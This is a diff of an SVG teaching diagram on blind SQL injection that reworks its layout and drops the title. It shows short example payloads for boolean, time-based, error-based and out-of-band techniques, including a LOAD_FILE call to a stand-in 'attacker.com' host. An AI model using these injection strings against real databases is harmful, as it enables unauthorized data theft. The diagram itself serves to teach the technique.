@@ -95,35 +95,34 @@
       <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
     </marker>
   </defs>
-  <text x="640" y="40" text-anchor="middle" font-size="28.0037" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Blind SQL Injection Techniques</text>
-  <rect x="40" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="330.9092" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Boolean-Based Blind</text>
-  <text x="330.9092" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Different response for TRUE vs FALSE</text>
-  <text x="330.9092" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
-  <rect x="658.1819" y="91.1765" width="581.8181" height="119.4118" rx="6" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="949.0909" y="133.8235" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--warn-accent)" font-family="Arial, sans-serif">Time-Based Blind</text>
-  <text x="949.0909" y="164.5294" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">SLEEP/WAITFOR delays on TRUE</text>
-  <text x="949.0909" y="190.1176" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND SLEEP(5)-- (5s delay)</text>
-  <rect x="40" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="330.9092" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Error-Based</text>
-  <text x="330.9092" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Force errors that leak data</text>
-  <text x="330.9092" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
-  <rect x="658.1819" y="244.7059" width="581.8181" height="119.4118" rx="6" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="949.0909" y="287.3529" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--ok-accent)" font-family="Arial, sans-serif">Out-of-Band (OOB)</text>
-  <text x="949.0909" y="318.0588" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">DNS/HTTP to attacker server</text>
-  <text x="949.0909" y="343.6471" text-anchor="middle" font-size="17.5024" fill="var(--text-muted)" font-family="Courier New, monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
-  <rect x="94.5455" y="432.3529" width="1090.9091" height="187.6471" rx="6" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="640" y="475" text-anchor="middle" font-size="21.0028" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Technique Comparison</text>
-  <text x="240" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Speed</text>
-  <text x="494.5455" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Reliability</text>
-  <text x="767.2727" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Stealthiness</text>
-  <text x="1021.8181" y="517.647" text-anchor="middle" font-size="17.5024" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Detection</text>
-  <text x="240" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Fast</text>
-  <text x="494.5455" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: High</text>
-  <text x="767.2727" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Time: Low</text>
-  <text x="1021.8181" y="560.2942" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">OOB: Hardest</text>
-  <text x="240" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Time: Slow</text>
-  <text x="494.5455" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">OOB: Medium</text>
-  <text x="767.2727" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Medium</text>
-  <text x="1021.8181" y="594.4118" text-anchor="middle" font-size="17.5024" fill="var(--text)" font-family="Arial, sans-serif">Error: Easiest</text>
+  <rect x="40" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="330.9092" y="86.774131633711" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Boolean-Based Blind</text>
+  <text x="330.9092" y="120.451572216439" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Different response for TRUE vs FALSE</text>
+  <text x="330.9092" y="148.516051196666" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
+  <rect x="658.1819" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="949.0909" y="86.774131633711" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--warn-accent)" font-family="Arial, sans-serif">Time-Based Blind</text>
+  <text x="949.0909" y="120.451572216439" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">SLEEP/WAITFOR delays on TRUE</text>
+  <text x="949.0909" y="148.516051196666" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND SLEEP(5)-- (5s delay)</text>
+  <rect x="40" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="330.9092" y="255.161224869924" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Error-Based</text>
+  <text x="330.9092" y="288.838665452651" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Force errors that leak data</text>
+  <text x="330.9092" y="316.903254110303" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
+  <rect x="658.1819" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="949.0909" y="255.161224869924" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--ok-accent)" font-family="Arial, sans-serif">Out-of-Band (OOB)</text>
+  <text x="949.0909" y="288.838665452651" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">DNS/HTTP to attacker server</text>
+  <text x="949.0909" y="316.903254110303" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
+  <rect x="94.5455" y="414.193491779393" width="1090.9091" height="205.806508220607" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="640" y="460.96773309053" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Technique Comparison</text>
+  <text x="240" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Speed</text>
+  <text x="494.5455" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Reliability</text>
+  <text x="767.2727" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Stealthiness</text>
+  <text x="1021.8181" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Detection</text>
+  <text x="240" y="554.516215712804" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Fast</text>
+  <text x="494.5455" y="554.516215712804" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Boolean: High</text>
+  <text x="767.2727" y="554.516215712804" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Time: Low</text>
+  <text x="1021.8181" y="554.516215712804" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">OOB: Hardest</text>
+  <text x="240" y="591.935521019773" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Time: Slow</text>
+  <text x="494.5455" y="591.935521019773" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">OOB: Medium</text>
+  <text x="767.2727" y="591.935521019773" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Boolean: Medium</text>
+  <text x="1021.8181" y="591.935521019773" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Error: Easiest</text>
 </svg>
